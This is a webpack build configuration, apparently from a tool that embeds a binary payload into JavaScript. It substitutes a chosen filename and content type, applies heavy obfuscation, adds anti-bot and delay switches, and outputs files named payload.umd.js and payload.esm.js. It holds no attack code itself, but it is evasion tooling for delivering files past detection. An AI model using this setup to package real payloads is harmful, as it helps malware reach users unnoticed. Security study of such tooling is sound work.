const path = require("path");
const webpack = require("webpack");
const WebpackObfuscator = require("webpack-obfuscator");
const obfuscatorOptions = require("./obfuscator");

module.exports = ({
  filename,
  filetype,
  funcname,
  compress,
  antibot,
  delay,
}) => {
  const commonConfig = {
    mode: "production",
    performance: {
      hints: false,
      maxEntrypointSize: 512000,
      maxAssetSize: 512000,
    },
    entry: "./src/index.js",
    module: {
      rules: [
        // NOTE: Defines string names,
        // used because webpack.DefinePlugin globals obfuscation issues.
        {
          test: /\.m?js$/,
          exclude: /node_modules/,
          use: {
            loader: "string-replace-loader",
            options: {
              multiple: [
                { search: "dont_change_filename_var", replace: filename },
                { search: "dont_change_content_type_var", replace: filetype },
                { search: "dontChangeFunctionName", replace: funcname },
              ],
            },
          },
        },
        // NOTE: embed out payload to js
        {
          test: /assets\/.*/,
          exclude: /node_modules/,
          use: {
            loader: "binary-loader",
          },
        },
        // NOTE: support for older browsers
        {
          test: /\.m?js$/,
          exclude: /node_modules/,
          use: {
            loader: "babel-loader",
          },
        },
        // NOTE: heavy obfuscation
        {
          test: /.*/,
          enforce: "post",
          // NOTE: excluded core-js because it takes too long to obfuscate
          exclude: /node_modules\/core-js/,
          use: {
            loader: WebpackObfuscator.loader,
            options: obfuscatorOptions,
          },
        },
      ],
    },
    plugins: [
      // NOTE: Defines boolean globals to change execution flow.
      new webpack.DefinePlugin({
        CONFIG_COMPRESS: JSON.stringify(compress),
        CONFIG_ANTIBOT: JSON.stringify(antibot),
        CONFIG_DELAY: JSON.stringify(delay),
      }),
    ],
  };

  return [
    {
      output: {
        path: path.resolve(__dirname, "dist"),
        filename: "payload.umd.js",
        libraryTarget: "umd",
      },
      ...commonConfig,
    },
    {
      output: {
        path: path.resolve(__dirname, "dist"),
        filename: "payload.esm.js",
        libraryTarget: "module",
      },
      experiments: {
        outputModule: true,
      },
      ...commonConfig,
    },
  ];
};
